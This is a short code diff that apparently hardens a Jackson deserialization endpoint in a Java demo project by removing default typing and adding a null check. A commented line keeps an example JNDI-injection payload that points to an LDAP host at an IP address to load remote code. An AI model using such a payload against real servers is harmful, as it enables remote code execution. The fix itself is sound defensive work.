@@ -87,13 +87,15 @@ public class Deserialize {
     // String payload = "[\"org.jsecurity.realm.jndi.JndiRealmFactory\", {\"jndiNames\":\"ldap://30.196.97.50:1389/yto8pc\"}]";
     @RequestMapping("/jackson")
     public void Jackson(String payload) {
+        if (payload == null) {
+            return;
+        }
         ObjectMapper mapper = new ObjectMapper();
-        mapper.enableDefaultTyping();
         try {
             Object obj = mapper.readValue(payload, Object.class);
             mapper.writeValueAsString(obj);
-        } catch (IOException e) {
-            e.printStackTrace();
+        } catch (Exception e) {
+            logger.error(e.toString());
         }
     }
 
